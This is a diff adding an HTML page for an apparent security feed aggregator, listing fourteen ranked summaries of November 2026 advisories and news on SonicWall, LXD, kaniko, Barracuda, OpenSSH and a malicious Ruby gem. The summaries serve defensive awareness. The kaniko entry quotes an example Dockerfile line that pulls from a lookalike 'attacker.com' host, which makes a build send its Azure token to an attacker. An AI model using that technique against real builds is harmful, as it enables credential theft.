@@ -1,0 +1,1342 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>feedrank.security — Sat Nov 07 2026 · 13:06 UTC</title>
+<link rel="alternate" type="application/atom+xml" title="feedrank.security" href="feedrank.xml">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Fraunces:opsz,wght,SOFT,WONK@9..144,400;9..144,500;9..144,600;9..144,700&family=Inter:wght@400;500;600;700&family=Recursive:slnt,wght,CASL,CRSV,MONO@-15..0,300..1000,0..1,0..1,0..1&family=Source+Serif+4:opsz,wght@8..60,400;8..60,600&display=swap" rel="stylesheet">
+<style>
+:root {
+  --bg:#f6f1e7; --bg-2:#ede5d3; --ink:#1a2540; --ink-2:#3a4566;
+  --rule:#cdbfa3; --accent:#b8331f; --accent-2:#c87633; --good:#4a6b3a;
+  --dim:#7a6c54; --hi:#fbe9b7;
+  --ft-text:'Inter',system-ui,-apple-system,sans-serif;
+  --ft-title:'Fraunces','Iowan Old Style',Georgia,serif;
+  --ft-read:'Source Serif 4','Iowan Old Style',Georgia,serif;
+  --ft-mono:'Recursive',ui-monospace,'SF Mono',Menlo,monospace;
+}
+*{box-sizing:border-box}
+html,body{margin:0;padding:0;background:var(--bg);color:var(--ink)}
+body{
+  font-family:var(--ft-text);
+  font-weight:400;line-height:1.55;font-size:15.5px;
+  -webkit-font-smoothing:antialiased;
+  text-rendering:optimizeLegibility;
+  background-image:repeating-linear-gradient(0deg,transparent 0 28px,rgba(26,37,64,0.03) 28px 29px);
+}
+.wrap{max-width:1180px;margin:0 auto;padding:40px 28px 80px}
+header{border-bottom:2px solid var(--ink);padding-bottom:18px;margin-bottom:28px}
+h1{font-family:var(--ft-mono);font-variation-settings:"MONO" 1,"wght" 700;font-size:38px;letter-spacing:-0.02em;margin:0 0 4px;line-height:1.1}
+h1 .amp{color:var(--accent);font-variation-settings:"MONO" 0,"CASL" 1,"CRSV" 1;font-size:42px}
+.tag{color:var(--dim);font-size:13px;font-family:var(--ft-mono);font-variation-settings:"MONO" 1}
+.meta{display:flex;gap:18px;flex-wrap:wrap;font-size:12.5px;color:var(--ink-2);margin-top:10px;font-family:var(--ft-mono);font-variation-settings:"MONO" 1}
+.meta b{color:var(--ink);font-weight:600}
+.controls{display:flex;gap:8px;flex-wrap:wrap;padding:14px 0 22px;border-bottom:1px dashed var(--rule);margin-bottom:22px}
+.search{flex:1;min-width:240px;padding:9px 12px;border:1px solid var(--ink);background:var(--bg-2);color:var(--ink);font-family:var(--ft-mono);font-size:14px;font-variation-settings:"MONO" 1}
+.search:focus{outline:2px solid var(--accent);outline-offset:-1px}
+.chip{padding:6px 11px;border:1px solid var(--ink-2);background:transparent;color:var(--ink-2);cursor:pointer;font-family:var(--ft-mono);font-size:12px;font-variation-settings:"MONO" 1}
+.chip:hover{background:var(--bg-2)}
+.chip.active{background:var(--ink);color:var(--bg);border-color:var(--ink)}
+.sort-row{display:flex;gap:6px;flex-wrap:wrap;align-items:center;padding:0 0 22px;border-bottom:1px dashed var(--rule);margin-bottom:22px}
+.sort-label{color:var(--dim);font-family:var(--ft-mono);font-size:11.5px;font-variation-settings:"MONO" 1;letter-spacing:0.05em;text-transform:uppercase;margin-right:4px}
+.sort{padding:5px 10px;border:1px solid transparent;background:transparent;color:var(--ink-2);cursor:pointer;font-family:var(--ft-mono);font-size:12px;font-variation-settings:"MONO" 1;display:inline-flex;align-items:center;gap:4px}
+.sort:hover{color:var(--ink);background:var(--bg-2)}
+.sort.active{color:var(--ink);font-variation-settings:"MONO" 1,"wght" 600;border-color:var(--rule);background:var(--bg-2)}
+.sort .arrow{display:inline-block;min-width:8px;color:var(--accent);font-size:11px;font-variation-settings:"wght" 700}
+.item{display:grid;grid-template-columns:56px minmax(0,1fr) auto;gap:20px;padding:20px 0;border-bottom:1px solid var(--rule);align-items:start}
+.body{min-width:0;overflow-wrap:anywhere}
+.item.hidden{display:none}
+.rank{font-family:var(--ft-mono);font-variation-settings:"MONO" 1,"wght" 500;font-size:22px;color:var(--ink-2);text-align:right;padding-top:2px;font-feature-settings:"tnum"}
+.rank-1,.rank-2,.rank-3{color:var(--accent);font-variation-settings:"MONO" 1,"wght" 700}
+.body h2{margin:0 0 8px;font-family:var(--ft-title);font-size:20px;line-height:1.3;font-weight:600;letter-spacing:-0.012em;font-variation-settings:"opsz" 24,"SOFT" 30}
+.body h2 a{color:var(--ink);text-decoration:none;border-bottom:1px solid transparent}
+.body h2 a:hover{border-bottom-color:var(--accent);color:var(--accent)}
+.summary{color:var(--ink-2);font-family:var(--ft-read);font-size:15px;line-height:1.55;margin:6px 0 10px}
+.kws{display:flex;gap:5px;flex-wrap:wrap;margin-top:8px;align-items:center}
+.kw{font-size:11px;padding:2px 7px;background:var(--hi);color:var(--ink);font-family:var(--ft-mono);font-variation-settings:"MONO" 1;border:1px solid var(--rule)}
+.sev{display:inline-block;font-size:10px;padding:2px 7px;margin-right:6px;font-family:var(--ft-mono);font-variation-settings:"MONO" 1,"wght" 600;letter-spacing:0.05em;text-transform:uppercase;border:1px solid}
+.sev-critical{background:var(--accent);color:var(--bg);border-color:var(--accent)}
+.sev-high{background:var(--accent-2);color:var(--bg);border-color:var(--accent-2)}
+.sev-medium{background:var(--bg-2);color:var(--ink);border-color:var(--ink-2)}
+.sev-low{background:var(--bg-2);color:var(--dim);border-color:var(--rule)}
+.cve{font-size:10px;padding:2px 6px;margin-right:4px;font-family:var(--ft-mono);font-variation-settings:"MONO" 1;color:var(--ink-2);border:1px dashed var(--rule);background:transparent}
+.corrob{display:inline-block;font-size:10px;padding:2px 7px;margin-right:6px;background:var(--ink);color:var(--bg);font-family:var(--ft-mono);font-variation-settings:"MONO" 1,"wght" 600}
+.also{margin-top:8px;padding-top:6px;border-top:1px dotted var(--rule);font-size:12px;color:var(--dim);font-family:var(--ft-mono);font-variation-settings:"MONO" 1}
+.also-link{color:var(--ink-2);text-decoration:none;border-bottom:1px dotted var(--rule);margin:0 2px}
+.also-link:hover{color:var(--accent);border-bottom-color:var(--accent)}
+.also-link.cat-advisory{color:var(--accent)}
+.also-link.cat-research{color:var(--ink-2)}
+.also-link.cat-aggregator{color:var(--accent-2)}
+.also-link.cat-government{color:var(--good)}
+.right{text-align:right;font-size:11.5px;color:var(--dim);font-family:var(--ft-mono);font-variation-settings:"MONO" 1;min-width:150px;display:flex;flex-direction:column;gap:4px;padding-top:4px}
+.right .src{color:var(--ink);font-weight:500}
+.right .src.cat-advisory{color:var(--accent)}
+.right .src.cat-research{color:var(--ink-2)}
+.right .src.cat-aggregator{color:var(--accent-2)}
+.right .src.cat-government{color:var(--good)}
+.empty{padding:60px 20px;text-align:center;color:var(--dim);font-family:var(--ft-mono)}
+.items.collapsed .item[data-overflow="true"]{display:none}
+.show-more{display:none;margin:24px auto 0;padding:10px 22px;border:1px solid var(--ink);background:transparent;color:var(--ink);font-family:var(--ft-mono);font-size:13px;font-variation-settings:"MONO" 1;cursor:pointer;letter-spacing:0.02em}
+.show-more:hover{background:var(--ink);color:var(--bg)}
+.show-more-count{color:var(--dim);margin-left:6px}
+footer{margin-top:60px;padding-top:18px;border-top:1px solid var(--rule);color:var(--dim);font-size:12px;font-family:var(--ft-mono);font-variation-settings:"MONO" 1;display:flex;justify-content:space-between;flex-wrap:wrap;gap:12px}
+@media (max-width:640px){
+  body{font-size:15px}
+  .wrap{padding:24px 18px 60px;max-width:100%}
+  .item{grid-template-columns:32px minmax(0,1fr);gap:14px;padding:16px 0}
+  .right{grid-column:2;text-align:left;min-width:0;font-size:11.5px}
+  h1{font-size:30px}
+  .body h2{font-size:17.5px;letter-spacing:-0.01em}
+  .summary{font-size:14.5px}
+  .also{overflow-wrap:anywhere}
+}
+</style>
+</head>
+<body><div class="wrap">
+<header>
+<h1>feedrank<span class="amp">.</span>security</h1>
+<div class="tag">supply chain &amp; infra security</div>
+<div class="meta">
+<span><b>30</b> sources</span>
+<span><b>5</b>d window</span>
+<span>generated <b>Sat Nov 07 2026 · 13:06 UTC</b></span>
+</div>
+</header>
+<div class="controls">
+<input class="search" id="search" placeholder="filter…  (regex: /pattern/)">
+<button class="chip active" data-cat="all">all</button>
+<button class="chip" data-cat="advisory">advisory</button>
+<button class="chip" data-cat="research">research</button>
+<button class="chip" data-cat="aggregator">aggregator</button>
+<button class="chip" data-cat="government">gov</button>
+<button class="chip" data-cat="build">build</button>
+<span style="width:1px;background:var(--rule);margin:0 6px"></span>
+<button class="chip" data-sev="critical">critical only</button>
+<button class="chip" data-sev="high">high+</button>
+</div>
+<div class="sort-row">
+<span class="sort-label">sort:</span>
+<button class="sort active" data-sort="trending">trending <span class="arrow">↓</span></button>
+<button class="sort" data-sort="date">date <span class="arrow"></span></button>
+<button class="sort" data-sort="sevrank">severity <span class="arrow"></span></button>
+<button class="sort" data-sort="corrob">reports <span class="arrow"></span></button>
+</div>
+<div class="items collapsed" id="items"><div class="item" data-cat="government" data-sev="critical" data-overflow="false" data-score="1.9265" data-date="1793966400" data-sevrank="4" data-cvss="9.0" data-corrob="2" data-text="sonicwall sonicos sslvpn: sonicwall sonicos sslvpn use of single-factor authentication vulnerability sonicwall sonicos sslvpn contains a use of single-factor authentication vulnerability that may allow a user with valid credentials for an alternate authentication method to bypass saml authentication controls. successful exploitation may also bypass saml-enforced multi-factor authentication (mfa). required action: apply mitigations in accordance with vendor instructions, ensuring compliance with cisa’s bod 26-04 prioritizing security updates based on risk (see url in notes) guidance and cisa’s “forensics triage requirements” (see url in notes). follow applicable bod 26-04 guidance for cloud services or discontinue use of the product if mitigations are unavailable. stakeholders are responsible for evaluating each asset&#x27;s internet exposure and ensuring adherence to bod 26-04 patching guidelines. saml mfa sonicwall cisa kev cve-2026-19868 critical cisa advisories">
+<div class="rank rank-1">01</div>
+<div class="body">
+<h2><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-19868" target="_blank" rel="noopener">SonicWall SonicOS SSLVPN: SonicWall SonicOS SSLVPN Use of Single-factor Authentication Vulnerability</a></h2>
+<div class="summary">SonicWall SonicOS SSLVPN contains a use of single-factor authentication vulnerability that may allow a user with valid credentials for an alternate authentication method to bypass SAML authentication controls. Successful exploitation may also bypass SAML-enforced multi-factor aut…</div>
+<div class="kws"><span class="sev sev-critical">critical 9.0</span><span class="corrob">×2 reports</span><span class="cve">CVE-2026-19868</span><span class="kw">saml</span><span class="kw">mfa</span><span class="kw">sonicwall</span></div>
+<div class="also">also: <a href="https://www.cisa.gov/news-events/alerts/2026/11/06/cisa-adds-one-known-exploited-vulnerability-catalog" target="_blank" rel="noopener" class="also-link cat-government">CISA Advisories</a></div>
+</div>
+<div class="right">
+<span class="src cat-government">CISA KEV</span>
+<span>Nov 06</span>
+<span>score 1.927</span>
+</div></div>
+<div class="item" data-cat="advisory" data-sev="critical" data-overflow="false" data-score="1.4401" data-date="1793994686" data-sevrank="4" data-cvss="9.9" data-corrob="11" data-text="lxd has restricted project bypass leading to arbitrary command execution affected: github.com/canonical/lxd. reported from https://github.com/lxc/incus/security/advisories/ghsa-48q5-w887-33wv ### summary instance snapshots ignore the `restricted.containers.lowlevel=block` setting; allowing for arbitrary command execution on the incus server by abusing lowlevel hooks such as `raw.lxc` and `raw.qemu`. ### details instance snapshots ignore the `restricted.containers.lowlevel=block` setting; allowing for arbitrary command execution on the incus server by abusing lowlevel hooks such as `raw.lxc` and `raw.qemu`. as snapshots can be moved from one server to another, a malicious instance+snapshot can b github qemu ghsa — go cve-2026-12411 cve-2026-28385 cve-2026-9639 critical ghsa — go ghsa — go ghsa — go ghsa — go ghsa — go ghsa — go ghsa — go ghsa — go ghsa — go ghsa — go">
+<div class="rank rank-2">02</div>
+<div class="body">
+<h2><a href="https://github.com/advisories/GHSA-47w9-6r3f-938g" target="_blank" rel="noopener">LXD has restricted project bypass leading to arbitrary command execution</a></h2>
+<div class="summary">Affected: github.com/canonical/lxd. Reported from https://github.com/lxc/incus/security/advisories/GHSA-48q5-w887-33wv ### Summary Instance snapshots ignore the `restricted.containers.lowlevel=block` setting; allowing for arbitrary command execution on the Incus server by abusing…</div>
+<div class="kws"><span class="sev sev-critical">critical 9.9</span><span class="corrob">×11 reports</span><span class="cve">CVE-2026-12411</span><span class="cve">CVE-2026-28385</span><span class="cve">CVE-2026-9639</span><span class="kw">github</span><span class="kw">qemu</span></div>
+<div class="also">also: <a href="https://github.com/advisories/GHSA-7mr3-28h5-m5vx" target="_blank" rel="noopener" class="also-link cat-advisory">GHSA — go</a>, <a href="https://github.com/advisories/GHSA-qx75-2p3r-pwm5" target="_blank" rel="noopener" class="also-link cat-advisory">GHSA — go</a>, <a href="https://github.com/advisories/GHSA-j93m-3j9p-m5m8" target="_blank" rel="noopener" class="also-link cat-advisory">GHSA — go</a>, <a href="https://github.com/advisories/GHSA-pjff-c2wc-f6jm" target="_blank" rel="noopener" class="also-link cat-advisory">GHSA — go</a>, <a href="https://github.com/advisories/GHSA-fmc8-p6q7-75cc" target="_blank" rel="noopener" class="also-link cat-advisory">GHSA — go</a></div>
+</div>
+<div class="right">
+<span class="src cat-advisory">GHSA — go</span>
+<span>Nov 06</span>
+<span>score 1.440</span>
+</div></div>
+<div class="item" data-cat="advisory" data-sev="critical" data-overflow="false" data-score="1.4262" data-date="1793985071" data-sevrank="4" data-cvss="9.0" data-corrob="2" data-text="shai-hulud descendant surfaces in malicious ruby gem that steals credentials and poisons ai tools a malicious ruby gem runs a credential-stealing worm during installation, poisons ai coding tools, and can wipe files when a stolen github token is revoked. ruby gem  github token credential shai-hulud socket blog  critical stepsecurity">
+<div class="rank rank-3">03</div>
+<div class="body">
+<h2><a href="https://socket.dev/blog/shai-hulud-descendant-malicious-ruby-gem?utm_medium=feed" target="_blank" rel="noopener">Shai-Hulud Descendant Surfaces in Malicious Ruby Gem That Steals Credentials and Poisons AI Tools</a></h2>
+<div class="summary">A malicious Ruby gem runs a credential-stealing worm during installation, poisons AI coding tools, and can wipe files when a stolen GitHub token is revoked.</div>
+<div class="kws"><span class="sev sev-critical">critical 9.0</span><span class="corrob">×2 reports</span><span class="kw">ruby</span><span class="kw">gem </span><span class="kw">github</span><span class="kw">token</span><span class="kw">credential</span><span class="kw">shai-hulud</span></div>
+<div class="also">also: <a href="https://www.stepsecurity.io/blog/malicious-files-find-what-supply-chain-attacks-leave-behind-in-your-github-repositories-and-on-developer-machines" target="_blank" rel="noopener" class="also-link cat-research">StepSecurity</a></div>
+</div>
+<div class="right">
+<span class="src cat-advisory">Socket Blog</span>
+<span>Nov 06</span>
+<span>score 1.426</span>
+</div></div>
+<div class="item" data-cat="aggregator" data-sev="critical" data-overflow="false" data-score="0.6762" data-date="1793981318" data-sevrank="4" data-cvss="9.5" data-corrob="1" data-text="installing the fix for an exploited wordpress flaw can expose some sites one last time some wordpress sites can still be attacked while they install the fix for an actively exploited flaw, according to umut bayram, the picus security researcher who found it. the update that installs the fix still unpacks its files using the site&#x27;s old, unpatched code, so an attacker who strikes at the right moment can run code on the server. the researcher advises blocking web access to the actively exploited the hacker news  critical ">
+<div class="rank ">04</div>
+<div class="body">
+<h2><a href="https://thehackernews.com/2026/11/installing-fix-for-exploited-wordpress.html" target="_blank" rel="noopener">Installing the Fix for an Exploited WordPress Flaw Can Expose Some Sites One Last Time</a></h2>
+<div class="summary">Some WordPress sites can still be attacked while they install the fix for an actively exploited flaw, according to Umut Bayram, the Picus Security researcher who found it. The update that installs the fix still unpacks its files using the site&#x27;s old, unpatched code, so an attacke…</div>
+<div class="kws"><span class="sev sev-critical">critical 9.5</span><span class="kw">actively exploited</span></div>
+
+</div>
+<div class="right">
+<span class="src cat-aggregator">The Hacker News</span>
+<span>Nov 06</span>
+<span>score 0.676</span>
+</div></div>
+<div class="item" data-cat="aggregator" data-sev="critical" data-overflow="false" data-score="0.3352" data-date="1793966803" data-sevrank="4" data-cvss="9.0" data-corrob="1" data-text="microsoft paint rce fix now available, but windows update won&#x27;t deliver it a fix for cve-2026-83844, a remote code execution flaw in windows paint, is now in the microsoft store. paint gets this fix only through a store update, not through windows updates. the fixed build, 11.2609.401.0, was the newest paint build in all ten countries the hacker news checked today. the flaw is an out-of-bounds read that could let an attacker run code over a network. microsoft rates windows rce cve- the hacker news cve-2026-83844 critical ">
+<div class="rank ">05</div>
+<div class="body">
+<h2><a href="https://thehackernews.com/2026/11/microsoft-paint-rce-fix-now-available.html" target="_blank" rel="noopener">Microsoft Paint RCE Fix Now Available, but Windows Update Won&#x27;t Deliver It</a></h2>
+<div class="summary">A fix for CVE-2026-83844, a remote code execution flaw in Windows Paint, is now in the Microsoft Store. Paint gets this fix only through a Store update, not through Windows updates. The fixed build, 11.2609.401.0, was the newest Paint build in all ten countries The Hacker News ch…</div>
+<div class="kws"><span class="sev sev-critical">critical 9.0</span><span class="cve">CVE-2026-83844</span><span class="kw">windows</span><span class="kw">rce</span><span class="kw">cve-</span></div>
+
+</div>
+<div class="right">
+<span class="src cat-aggregator">The Hacker News</span>
+<span>Nov 06</span>
+<span>score 0.335</span>
+</div></div>
+<div class="item" data-cat="aggregator" data-sev="critical" data-overflow="false" data-score="0.2285" data-date="1793944734" data-sevrank="4" data-cvss="9.0" data-corrob="1" data-text="hackers hide linux backdoor in control web panel server to execute commands without logs a backdoor has been found hiding in the web server that runs control web panel (cwp), a free panel for managing linux hosting servers, researchers at qianxin&#x27;s xlab said this week. the backdoored web server executes commands that attackers send via web requests, and those requests never appear in its access logs. installing it takes root access, so the attackers must already control the server. linux backdoor the hacker news  critical ">
+<div class="rank ">06</div>
+<div class="body">
+<h2><a href="https://thehackernews.com/2026/11/hackers-hide-linux-backdoor-in-control.html" target="_blank" rel="noopener">Hackers Hide Linux Backdoor in Control Web Panel Server to Execute Commands Without Logs</a></h2>
+<div class="summary">A backdoor has been found hiding in the web server that runs Control Web Panel (CWP), a free panel for managing Linux hosting servers, researchers at QiAnXin&#x27;s XLab said this week. The backdoored web server executes commands that attackers send via web requests, and those request…</div>
+<div class="kws"><span class="sev sev-critical">critical 9.0</span><span class="kw">linux</span><span class="kw">backdoor</span></div>
+
+</div>
+<div class="right">
+<span class="src cat-aggregator">The Hacker News</span>
+<span>Nov 06</span>
+<span>score 0.228</span>
+</div></div>
+<div class="item" data-cat="advisory" data-sev="high" data-overflow="false" data-score="0.6696" data-date="1793988760" data-sevrank="3" data-cvss="0.0" data-corrob="1" data-text="osac operator: kubeconfig credential-plugin execution and ssrf in console proxy affected: github.com/osac-project/osac-operator. ### impact the console-proxy&#x27;s remoteconfigresolver parses kubeconfig data from kubernetes secrets using clientcmd.restconfigfromkubeconfig without sanitizing the resulting rest.config. a kubeconfig containing an exec plugin stanza (under users[].user.exec) is faithfully preserved. when rest.transportfor later builds the http transport for the upstream websocket connection, client-go invokes the exec plugin — spawning an arbitrary process as the osac-console-proxy service account. this allows remote code execution inside the console-proxy pod for any principal that can create or modif go  github kubernetes credential ssrf ghsa — go cve-2026-62284 high ">
+<div class="rank ">07</div>
+<div class="body">
+<h2><a href="https://github.com/advisories/GHSA-5w5g-j6hw-6p8f" target="_blank" rel="noopener">OSAC operator: Kubeconfig credential-plugin execution and SSRF in console proxy</a></h2>
+<div class="summary">Affected: github.com/osac-project/osac-operator. ### Impact The console-proxy&#x27;s RemoteConfigResolver parses kubeconfig data from Kubernetes Secrets using clientcmd.RESTConfigFromKubeConfig without sanitizing the resulting rest.Config. A kubeconfig containing an exec plugin stanza…</div>
+<div class="kws"><span class="sev sev-high">high</span><span class="cve">CVE-2026-62284</span><span class="kw">go </span><span class="kw">github</span><span class="kw">kubernetes</span><span class="kw">credential</span><span class="kw">ssrf</span></div>
+
+</div>
+<div class="right">
+<span class="src cat-advisory">GHSA — go</span>
+<span>Nov 06</span>
+<span>score 0.670</span>
+</div></div>
+<div class="item" data-cat="aggregator" data-sev="high" data-overflow="false" data-score="0.5119" data-date="1793990812" data-sevrank="3" data-cvss="8.5" data-corrob="1" data-text="fake security tools on github push backdoors and infostealers cybersecurity professionals are being targeted with infected security projects on github that deploy a backdoor and information stealer malware. [...] github stealer backdoor bleepingcomputer  high ">
+<div class="rank ">08</div>
+<div class="body">
+<h2><a href="https://www.bleepingcomputer.com/news/security/fake-security-tools-on-github-push-backdoors-and-infostealers/" target="_blank" rel="noopener">Fake security tools on GitHub push backdoors and infostealers</a></h2>
+<div class="summary">Cybersecurity professionals are being targeted with infected security projects on GitHub that deploy a backdoor and information stealer malware. [...]</div>
+<div class="kws"><span class="sev sev-high">high 8.5</span><span class="kw">github</span><span class="kw">stealer</span><span class="kw">backdoor</span></div>
+
+</div>
+<div class="right">
+<span class="src cat-aggregator">BleepingComputer</span>
+<span>Nov 06</span>
+<span>score 0.512</span>
+</div></div>
+<div class="item" data-cat="aggregator" data-sev="high" data-overflow="false" data-score="0.4257" data-date="1793943550" data-sevrank="3" data-cvss="8.0" data-corrob="2" data-text="experts demonstrate barracuda email security gateway chain enabling root access without login two flaws in barracuda&#x27;s email security gateway, an email-filtering appliance, can be chained to run commands on it as root, its highest level of access, with no login required. the company released patches on monday, and the security firm watchtowr detailed the attack chain on thursday. one flaw, cve-2026-116606, is an authorization bypass. an unauthenticated attacker can use it to restore a barracuda cve- the hacker news cve-2026-116606 high the hacker news">
+<div class="rank ">09</div>
+<div class="body">
+<h2><a href="https://thehackernews.com/2026/11/experts-demonstrate-barracuda-email.html" target="_blank" rel="noopener">Experts Demonstrate Barracuda Email Security Gateway Chain Enabling Root Access Without Login</a></h2>
+<div class="summary">Two flaws in Barracuda&#x27;s Email Security Gateway, an email-filtering appliance, can be chained to run commands on it as root, its highest level of access, with no login required. The company released patches on Monday, and the security firm watchTowr detailed the attack chain on T…</div>
+<div class="kws"><span class="sev sev-high">high 8.0</span><span class="corrob">×2 reports</span><span class="cve">CVE-2026-116606</span><span class="kw">barracuda</span><span class="kw">cve-</span></div>
+<div class="also">also: <a href="https://thehackernews.com/2026/11/barracuda-flaws-could-be-chained-to.html" target="_blank" rel="noopener" class="also-link cat-aggregator">The Hacker News</a></div>
+</div>
+<div class="right">
+<span class="src cat-aggregator">The Hacker News</span>
+<span>Nov 06</span>
+<span>score 0.426</span>
+</div></div>
+<div class="item" data-cat="aggregator" data-sev="high" data-overflow="false" data-score="0.1674" data-date="1793996659" data-sevrank="3" data-cvss="7.5" data-corrob="1" data-text="openai&#x27;s new gpt-6 cyber ai finds 81 firefox flaws, 948 linux bugs openai has revealed gpt-6 cyber, a new artificial intelligence model that has discovered 81 previously unknown high-severity firefox vulnerabilities and developed working exploits for 948 distinct linux kernel flaws. [...] linux kernel firefox bleepingcomputer  high ">
+<div class="rank ">10</div>
+<div class="body">
+<h2><a href="https://www.bleepingcomputer.com/news/security/openais-new-gpt-6-cyber-ai-finds-81-firefox-flaws-948-linux-bugs/" target="_blank" rel="noopener">OpenAI&#x27;s new GPT-6 Cyber AI finds 81 Firefox flaws, 948 Linux bugs</a></h2>
+<div class="summary">OpenAI has revealed GPT-6 Cyber, a new artificial intelligence model that has discovered 81 previously unknown high-severity Firefox vulnerabilities and developed working exploits for 948 distinct Linux kernel flaws. [...]</div>
+<div class="kws"><span class="sev sev-high">high 7.5</span><span class="kw">linux</span><span class="kw">kernel</span><span class="kw">firefox</span></div>
+
+</div>
+<div class="right">
+<span class="src cat-aggregator">BleepingComputer</span>
+<span>Nov 06</span>
+<span>score 0.167</span>
+</div></div>
+<div class="item" data-cat="advisory" data-sev="critical" data-overflow="true" data-score="1.0528" data-date="1793900934" data-sevrank="4" data-cvss="9.3" data-corrob="1" data-text="kaniko can send the build&#x27;s azure (entra id) access token to lookalike acr registry hosts affected: github.com/chainguard-dev/kaniko. ### summary kaniko before v1.25.20 can send a microsoft entra id (azure ad) access token for azure resource manager to a registry host an attacker controls. a dockerfile that references an image on a lookalike host, such as `from x.azurecr.io.attacker.com/img`, is enough. the build needs no `run` instruction and never has to push. the flaw is in the azure container registry (acr) credential helper, `github.com/chrismellard/docker-credential-acr-env`. kaniko links it into the executor and warmer (the built-in helper) and also builds it as the standalone `docker-credential-acr-env` binary. the github container docker azure entra token credential ghsa — go cve-2026-105769 critical ">
+<div class="rank ">11</div>
+<div class="body">
+<h2><a href="https://github.com/advisories/GHSA-5q7h-w9jf-cx97" target="_blank" rel="noopener">kaniko can send the build&#x27;s Azure (Entra ID) access token to lookalike ACR registry hosts</a></h2>
+<div class="summary">Affected: github.com/chainguard-dev/kaniko. ### Summary kaniko before v1.25.20 can send a Microsoft Entra ID (Azure AD) access token for Azure Resource Manager to a registry host an attacker controls. A Dockerfile that references an image on a lookalike host, such as `FROM x.azur…</div>
+<div class="kws"><span class="sev sev-critical">critical 9.3</span><span class="cve">CVE-2026-105769</span><span class="kw">github</span><span class="kw">container</span><span class="kw">docker</span><span class="kw">azure</span><span class="kw">entra</span><span class="kw">token</span></div>
+
+</div>
+<div class="right">
+<span class="src cat-advisory">GHSA — go</span>
+<span>Nov 05</span>
+<span>score 1.053</span>
+</div></div>
+<div class="item" data-cat="aggregator" data-sev="critical" data-overflow="true" data-score="0.9750" data-date="1793862393" data-sevrank="4" data-cvss="9.5" data-corrob="1" data-text="zyxel gs1900 patch fails to block zero-day exploit allowing root command execution zyxel gs1900 network switches that received the vendor&#x27;s earlier fix for an actively exploited flaw are still open to the exploit attackers used, researchers at binarly found. the exploit lets anyone who can reach a switch&#x27;s web management interface run commands on it without logging in. zyxel has released new firmware for 10 gs1900 models that closes the hole. the earlier fix is the 2.90 zero-day exploit actively exploited the hacker news  critical ">
+<div class="rank ">12</div>
+<div class="body">
+<h2><a href="https://thehackernews.com/2026/11/zyxel-gs1900-patch-fails-to-block-zero.html" target="_blank" rel="noopener">Zyxel GS1900 Patch Fails to Block Zero-Day Exploit Allowing Root Command Execution</a></h2>
+<div class="summary">Zyxel GS1900 network switches that received the vendor&#x27;s earlier fix for an actively exploited flaw are still open to the exploit attackers used, researchers at Binarly found. The exploit lets anyone who can reach a switch&#x27;s web management interface run commands on it without log…</div>
+<div class="kws"><span class="sev sev-critical">critical 9.5</span><span class="kw">zero-day</span><span class="kw">exploit</span><span class="kw">actively exploited</span></div>
+
+</div>
+<div class="right">
+<span class="src cat-aggregator">The Hacker News</span>
+<span>Nov 05</span>
+<span>score 0.975</span>
+</div></div>
+<div class="item" data-cat="government" data-sev="critical" data-overflow="true" data-score="0.8071" data-date="1793855824" data-sevrank="4" data-cvss="9.0" data-corrob="2" data-text="apple multiple products: apple multiple products improper authentication vulnerability apple ios, ipados, macos, safari, tvos and watchos 10.5 contain an improper authentication vulnerability which could allow an attacker with arbitrary read and write capability to bypass pointer authentication. required action: apply mitigations in accordance with vendor instructions, ensuring compliance with cisa’s bod 26-04 prioritizing security updates based on risk (see url in notes) guidance and cisa’s “forensics triage requirements” (see url in notes). follow applicable bod 26-04 guidance for cloud services or discontinue use of the product if mitigations are unavailable. stakeholders are responsible for evaluating each asset&#x27;s internet exposure and ensuring adherence to bod 26-04 patching guidelines. macos apple safari cisa kev cve-2024-27834 critical the hacker news">
+<div class="rank ">13</div>
+<div class="body">
+<h2><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-27834" target="_blank" rel="noopener">Apple Multiple Products: Apple Multiple Products Improper Authentication Vulnerability</a></h2>
+<div class="summary">Apple iOS, iPadOS, macOS, Safari, tvOS and watchOS 10.5 contain an improper authentication vulnerability which could allow an attacker with arbitrary read and write capability to bypass pointer authentication. Required action: Apply mitigations in accordance with vendor instructi…</div>
+<div class="kws"><span class="sev sev-critical">critical 9.0</span><span class="corrob">×2 reports</span><span class="cve">CVE-2024-27834</span><span class="kw">macos</span><span class="kw">apple</span><span class="kw">safari</span></div>
+<div class="also">also: <a href="https://thehackernews.com/2026/11/hackers-exploit-patched-apple-flaw-to.html" target="_blank" rel="noopener" class="also-link cat-aggregator">The Hacker News</a></div>
+</div>
+<div class="right">
+<span class="src cat-government">CISA KEV</span>
+<span>Nov 05</span>
+<span>score 0.807</span>
+</div></div>
+<div class="item" data-cat="aggregator" data-sev="critical" data-overflow="true" data-score="0.4648" data-date="1793896966" data-sevrank="4" data-cvss="9.5" data-corrob="1" data-text="openssh issues emergency fix for flaw letting long passwords bypass ssh auth on alpine linux attackers can log in to accounts that have no password, such as ssh key-only accounts, on some alpine linux servers running the standard openssh-server package. they need network access to the server, an account name, and a password between 257 and 1,024 bytes long. openssh, which rates the flaw critical, released version 10.6p2 today to block it. alpine has published fixed packages for every linux alpine ssh openssh the hacker news  critical ">
+<div class="rank ">14</div>
+<div class="body">
+<h2><a href="https://thehackernews.com/2026/11/openssh-issues-emergency-fix-for-flaw.html" target="_blank" rel="noopener">OpenSSH Issues Emergency Fix for Flaw Letting Long Passwords Bypass SSH Auth on Alpine Linux</a></h2>
+<div class="summary">Attackers can log in to accounts that have no password, such as SSH key-only accounts, on some Alpine Linux servers running the standard openssh-server package. They need network access to the server, an account name, and a password between 257 and 1,024 bytes long. OpenSSH, whic…</div>
+<div class="kws"><span class="sev sev-critical">critical 9.5</span><span class="kw">linux</span><span class="kw">alpine</span><span class="kw">ssh</span><span class="kw">openssh</span></div>
+
+</div>
+<div class="right">
+<span class="src cat-aggregator">The Hacker News</span>
+<span>Nov 05</span>
+<span>score 0.465</span>
+</div></div>
